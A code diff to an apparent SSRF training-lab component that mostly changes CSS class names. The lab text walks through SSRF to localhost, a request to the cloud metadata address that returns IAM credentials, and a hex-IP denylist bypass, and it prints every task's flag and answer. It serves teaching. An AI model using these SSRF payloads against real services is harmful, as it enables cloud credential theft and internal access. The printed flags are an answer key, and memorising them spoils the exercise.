@@ -72,16 +72,16 @@ export function SsrfAttackClient({
     <div className="space-y-6">
       {/* Task 1 — Basic SSRF */}
       <TaskShell number={1} title="Basic SSRF" unlocked completed={done("task_1")}>
-        <p className="text-ink-2 text-sm mb-3">
+        <p className="text-zinc-300 text-sm mb-3">
           The application fetches a user-supplied URL server-side without validation.
           An attacker can point this to internal services that are not accessible from the internet.
         </p>
-        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-3 space-y-3">
-          <p className="font-mono text-xs text-ink-3">Vulnerable endpoint:</p>
-          <code className="font-mono text-xs text-warn break-all">
+        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-3 space-y-3">
+          <p className="font-mono text-xs text-zinc-500">Vulnerable endpoint:</p>
+          <code className="font-mono text-xs text-amber-300 break-all">
             https://example.com/fetch?url=[user-controlled URL]
           </code>
-          <p className="font-mono text-xs text-ink-3 mt-3">Response when targeting internal admin:</p>
+          <p className="font-mono text-xs text-zinc-500 mt-3">Response when targeting internal admin:</p>
           <pre className="font-mono text-xs text-cyan-300 whitespace-pre-wrap">{`GET /fetch?url=http://localhost/admin
 
 HTTP/1.1 200 OK
@@ -89,9 +89,9 @@ HTTP/1.1 200 OK
         </div>
         {!done("task_1") && (
           <form onSubmit={submitT1} className="space-y-2">
-            <p className="text-sm text-ink-2 font-medium">What internal URL reveals the admin panel?</p>
-            <p className="text-xs text-ink-3 mb-2">
-              Enter a URL targeting localhost or 127.0.0.1 (e.g. <code className="font-mono text-warn">http://localhost/admin</code>).
+            <p className="text-sm text-zinc-300 font-medium">What internal URL reveals the admin panel?</p>
+            <p className="text-xs text-zinc-500 mb-2">
+              Enter a URL targeting localhost or 127.0.0.1 (e.g. <code className="font-mono text-amber-300">http://localhost/admin</code>).
             </p>
             <div className="flex gap-2 max-w-md">
               <MonoInput
@@ -102,11 +102,11 @@ HTTP/1.1 200 OK
               />
               <SubmitBtn label="Submit" />
             </div>
-            {t1Error && <p className="text-xs text-danger font-mono">{t1Error}</p>}
+            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
           </form>
         )}
         {done("task_1") && (
-          <p className="text-sm font-mono text-ok">
+          <p className="text-sm font-mono text-sage-400">
             Correct — SSRF enables access to internal services. Flag: SAGE&#123;ssrf_1nt3rn4l_4cc3ss&#125;
           </p>
         )}
@@ -114,13 +114,13 @@ HTTP/1.1 200 OK
 
       {/* Task 2 — Cloud Metadata */}
       <TaskShell number={2} title="Cloud Metadata" unlocked={done("task_1")} completed={done("task_2")}>
-        <p className="text-ink-2 text-sm mb-3">
+        <p className="text-zinc-300 text-sm mb-3">
           Cloud providers expose an instance metadata service at a link-local address.
           By pivoting through SSRF, attackers can steal IAM credentials with no authentication.
         </p>
-        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-4 space-y-3">
-          <p className="font-mono text-xs text-ink-3">SSRF request to metadata endpoint:</p>
-          <pre className="font-mono text-xs text-warn whitespace-pre-wrap break-all">{`GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 space-y-3">
+          <p className="font-mono text-xs text-zinc-500">SSRF request to metadata endpoint:</p>
+          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap break-all">{`GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 HTTP/1.1 200 OK
 {
@@ -129,13 +129,13 @@ HTTP/1.1 200 OK
   "SecretAccessKey": "wJal...",
   "Token": "AQoDYXdzEJ..."
 }`}</pre>
-          <p className="text-xs text-ink-3">
+          <p className="text-xs text-zinc-500">
             Stolen credentials grant full API access as the instance role — a full cloud compromise.
           </p>
         </div>
         {!done("task_2") && (
           <form onSubmit={submitT2} className="space-y-2">
-            <p className="text-sm text-ink-2 font-medium">What is the AWS metadata service IP address?</p>
+            <p className="text-sm text-zinc-300 font-medium">What is the AWS metadata service IP address?</p>
             <div className="flex gap-2 max-w-md">
               <MonoInput
                 value={t2Answer}
@@ -145,11 +145,11 @@ HTTP/1.1 200 OK
               />
               <SubmitBtn label="Submit" />
             </div>
-            {t2Error && <p className="text-xs text-danger font-mono">{t2Error}</p>}
+            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
           </form>
         )}
         {done("task_2") && (
-          <p className="text-sm font-mono text-ok">
+          <p className="text-sm font-mono text-sage-400">
             Correct — 169.254.169.254 is the link-local metadata endpoint. Flag: SAGE&#123;cl0ud_m3t4d4t4_ssrf&#125;
           </p>
         )}
@@ -157,25 +157,25 @@ HTTP/1.1 200 OK
 
       {/* Task 3 — Filter Bypass */}
       <TaskShell number={3} title="Filter Bypass" unlocked={done("task_2")} completed={done("task_3")}>
-        <p className="text-ink-2 text-sm mb-3">
+        <p className="text-zinc-300 text-sm mb-3">
           The developer added a denylist to block obvious SSRF targets. However, IP address
           representations can be obfuscated to evade naive string matching.
         </p>
-        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-4 space-y-2">
-          <p className="font-mono text-xs text-ink-3">Server-side filter (Python pseudocode):</p>
-          <pre className="font-mono text-xs text-danger whitespace-pre-wrap">{`BLOCKED = ["localhost", "127.0.0.1", "0.0.0.0"]
+        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 space-y-2">
+          <p className="font-mono text-xs text-zinc-500">Server-side filter (Python pseudocode):</p>
+          <pre className="font-mono text-xs text-red-400 whitespace-pre-wrap">{`BLOCKED = ["localhost", "127.0.0.1", "0.0.0.0"]
 
 if any(blocked in url for blocked in BLOCKED):
     return 403  # blocked
 # But 0x7f000001 is NOT in the denylist...`}</pre>
-          <p className="text-xs text-ink-3">
-            <code className="text-warn font-mono">0x7f000001</code> is the hexadecimal representation of <code className="text-warn font-mono">127.0.0.1</code>.
+          <p className="text-xs text-zinc-500">
+            <code className="text-amber-300 font-mono">0x7f000001</code> is the hexadecimal representation of <code className="text-amber-300 font-mono">127.0.0.1</code>.
             Many HTTP libraries resolve it identically.
           </p>
         </div>
         {!done("task_3") && (
           <form onSubmit={submitT3} className="space-y-2">
-            <p className="text-sm text-ink-2 font-medium">What hex representation of 127.0.0.1 bypasses this filter?</p>
+            <p className="text-sm text-zinc-300 font-medium">What hex representation of 127.0.0.1 bypasses this filter?</p>
             <div className="flex gap-2 max-w-md">
               <MonoInput
                 value={t3Answer}
@@ -185,23 +185,23 @@ if any(blocked in url for blocked in BLOCKED):
               />
               <SubmitBtn label="Submit" />
             </div>
-            {t3Error && <p className="text-xs text-danger font-mono">{t3Error}</p>}
+            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
           </form>
         )}
         {done("task_3") && (
-          <p className="text-sm font-mono text-ok">
+          <p className="text-sm font-mono text-sage-400">
             Correct — 0x7f000001 (or decimal 2130706433) bypasses naive string filters. Flag: SAGE&#123;1p_0bfusc4t10n_byp4ss&#125;
           </p>
         )}
       </TaskShell>
 
       {allDone && (
-        <div className="rounded-lg border border-ok-edge bg-ok-wash p-5 space-y-3">
-          <h3 className="font-bold text-ok text-base">Room Complete</h3>
+        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
+          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
           <ul className="space-y-1 font-mono text-sm">
-            <li><span className="text-ink-3">Task 1 —</span> <span className="text-ok">SAGE&#123;ssrf_1nt3rn4l_4cc3ss&#125;</span></li>
-            <li><span className="text-ink-3">Task 2 —</span> <span className="text-ok">SAGE&#123;cl0ud_m3t4d4t4_ssrf&#125;</span></li>
-            <li><span className="text-ink-3">Task 3 —</span> <span className="text-ok">SAGE&#123;1p_0bfusc4t10n_byp4ss&#125;</span></li>
+            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;ssrf_1nt3rn4l_4cc3ss&#125;</span></li>
+            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;cl0ud_m3t4d4t4_ssrf&#125;</span></li>
+            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;1p_0bfusc4t10n_byp4ss&#125;</span></li>
           </ul>
         </div>
       )}
